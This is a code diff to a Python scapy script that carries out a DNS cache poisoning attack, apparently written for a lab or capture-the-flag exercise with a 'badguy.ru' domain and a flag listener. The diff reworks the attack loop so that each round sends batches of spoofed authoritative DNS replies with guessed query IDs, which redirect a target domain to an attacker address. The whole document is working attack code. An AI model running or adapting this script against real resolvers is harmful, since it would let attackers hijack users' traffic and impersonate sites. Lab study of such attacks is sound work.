@@ -5,6 +5,7 @@
 This script makes
 
 """
+import signal
 import string
 
 from scapy.packet import Raw
@@ -49,13 +50,20 @@ BADGUY_REDIRECT_IP = "192.168.56.1"
 VICTORY_FLAG_PORT = 1337
 BUFFER_SIZE = 8192
 
-NUMBER_OF_PACKETS = 500  # number of packets per attempt
-TIME_SLEEP_SECONDS = 3  # seconds of delay before attack
+NUMBER_OF_PACKETS = 25  # number of packets per attempt
+TIME_SLEEP_SECONDS = 2  # seconds of delay before attack
 
 ATTACK_GOING_ON = True
 
 TARGET_PORT = 0
 STARTING_QUERY_ID = 0
+
+
+def signal_handler(sig, frame):
+    print('You pressed Ctrl+C, Closing everything!')
+    global ATTACK_GOING_ON
+    ATTACK_GOING_ON = False
+    sys.exit(0)
 
 
 def dns_server_routine():
@@ -74,11 +82,18 @@ def dns_server_routine():
             # print(DNS_ROUTINE_HEADER + "Sniffed ip src " + str(sniffed_ip.src)
             # + ", src port: " + str(sniffed_ip.sport))
             # print(DNS_ROUTINE_HEADER + "Dst ip:" + str(sniffed_ip.dst) + ", dest port:" + str(sniffed_ip.dport))
-            print(DNS_ROUTINE_HEADER + "New target port response (source port) is " + str(target_port))
-            TARGET_PORT = target_port
-            first_query_id = decode_dns_message(a[0].getlayer(Raw).load)["id"]
-            print(DNS_ROUTINE_HEADER + "New query Id found is " + str(first_query_id))
+            if TARGET_PORT != target_port:
+                print(DNS_ROUTINE_HEADER + "New target port is " + str(target_port))
+                TARGET_PORT = target_port
+            if sniffed_packet.haslayer(DNS):
+                first_query_id = sniffed_packet.getlayer(DNS).id
+            else:
+                first_query_id = decode_dns_message(a[0].getlayer(Raw).load)["id"]
+
+            print(DNS_ROUTINE_HEADER + "New query id found is " + str(first_query_id))
             STARTING_QUERY_ID = first_query_id
+
+            # we just reply here to the request
             dns_record_request = DNSQR(qname=DNS_URL_BADGUY)
             dns_answer = DNSRR(rrname=DNS_URL_BADGUY, type="A", ttl=600, rclass="IN", rdata="192.168.56.1")
             # print(DNS_ROUTINE_HEADER + "Sending badguy.ru DNS response...")
@@ -99,7 +114,7 @@ def randomize_url(url_length=3):
 
 
 def random_query_id(last_query_id, modifier=0):
-    last_query_id += randint(1, 500 + modifier)
+    last_query_id += randint(1, 25 + modifier)
     return last_query_id % 65536  # 16 bit maximum delimiter of query_id's DNS field
 
 
@@ -117,44 +132,51 @@ def bite_the_rat():
     time.sleep(TIME_SLEEP_SECONDS)
     print(BITE_THE_RAT_HEADER + "Sending first request to " + TARGET_IP +
           " asking for badguy.ru to get an initial queryId and port with our DNS")
-    j = 0
+
     while ATTACK_GOING_ON:
+        # we need this request to get a get an updated value of query id
         first_dns_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=DNS_URL_BADGUY))
         send(first_dns_req, verbose=0)
-        query_id = random_query_id(STARTING_QUERY_ID,
-                                   50)  # after badguy.ru req we notice there's an increase of queryid
+        time.sleep(TIME_SLEEP_SECONDS)
+
         # since we've to guess the new query id we define an incremental pseudo random generator
         random_url = randomize_url(randint(1, 10)) + URL_TO_POISON
-        guess_query_id = random_query_id(query_id)
         dns_record_req = DNSQR(qname=random_url)
         dns_authoritative_answer = DNSRR(rrname=random_url, type="A", ttl=3600, rclass="IN", rdata=BADGUY_REDIRECT_IP)
         dns_additional_answer = DNSRR(rrname=URL_TO_POISON, rdata=BADGUY_REDIRECT_IP, type="A", rclass="IN", ttl=3600)
         dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=dns_record_req)
-        attack_res_packet = (IP(src=SPOOFED_DNS, dst=TARGET_IP) /
-                             UDP(sport=53, dport=TARGET_PORT) /
-                             DNS(
-                                 id=guess_query_id,
-                                 rd=0,
-                                 qd=dns_record_req,
-                                 qr=1,
-                                 aa=1,
-                                 ra=0,
-                                 z=0,
-                                 rcode=0,
-                                 qdcount=1,
-                                 ancount=1,
-                                 nscount=0,
-                                 arcount=1,
-                                 ar=dns_authoritative_answer,
-                                 an=dns_additional_answer))
 
-        # print(BITE_THE_RAT_HEADER + "Send malicious request # " + str(j) + "...")
+        payloaded_packets = []
+        query_id = random_query_id(STARTING_QUERY_ID, 100)  # after badguy.ru req we notice an increase of queryid
+        for i in range(NUMBER_OF_PACKETS):
+            guess_query_id = random_query_id(query_id)
+
+            attack_res_packet = (IP(src=SPOOFED_DNS, dst=TARGET_IP) /
+                                 UDP(dport=TARGET_PORT) /
+                                 DNS(
+                                     id=guess_query_id,
+                                     rd=0,
+                                     qd=dns_record_req,
+                                     qr=1,
+                                     aa=1,
+                                     ra=0,
+                                     z=0,
+                                     rcode=0,
+                                     qdcount=1,
+                                     ancount=1,
+                                     nscount=0,
+                                     arcount=1,
+                                     ar=dns_authoritative_answer,
+                                     an=dns_additional_answer))
+            payloaded_packets.append(attack_res_packet)
+
+        print(BITE_THE_RAT_HEADER + "Query id guessed: " +
+              str(payloaded_packets[int(NUMBER_OF_PACKETS / 2)].getlayer(DNS).id)
+              + ", random_url: \"" + random_url + "\" ")
         send(dns_malicious_req, verbose=0)
-        send(attack_res_packet, verbose=0)
-        if j % 10 == 0:
-            print(BITE_THE_RAT_HEADER + "Attack packet # " + str(j) + ", query id: " +
-                  str(attack_res_packet.getlayer(DNS).id) + ", random_url: \"" + random_url + "\" ")
-        j += 1
+
+        for packet in payloaded_packets:
+            send(packet, verbose=0)
 
 
 def flag_victory_listener():
@@ -168,16 +190,17 @@ def flag_victory_listener():
     sock.bind((BADGUY_REDIRECT_IP, VICTORY_FLAG_PORT))
     print(LISTENER_HEADER + "done!")
     global ATTACK_GOING_ON
-    try:
-        while ATTACK_GOING_ON:
+
+    while ATTACK_GOING_ON:
+        try:
             data, addr = sock.recvfrom(BUFFER_SIZE)
             print(LISTENER_HEADER + "\n\nReceived from \"" + addr[0] + "\": " + str(data) + "\n\n")
             ATTACK_GOING_ON = False
-    except KeyboardInterrupt:
-        print(LISTENER_HEADER + "Closing socket to exit gracefully...")
-        sock.close()
-        print(LISTENER_HEADER + "Socket closed, bye bye!")
-        sys.exit(0)
+        except KeyboardInterrupt:
+            print(LISTENER_HEADER + "Closing socket to exit gracefully...")
+            sock.close()
+            print(LISTENER_HEADER + "Socket closed, bye bye!")
+            sys.exit(0)
 
     print(LISTENER_HEADER + "Attack finished, closing socket to exit gracefully...")
     sock.close()
@@ -197,6 +220,9 @@ def main():
     bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat)
     dns_badguy_thread.start()
     bite_rat_thread.start()
+
+    signal.signal(signal.SIGINT, signal_handler)
+
     bite_rat_thread.join()
     dns_badguy_thread.join()
     flag_victory_thread.join()
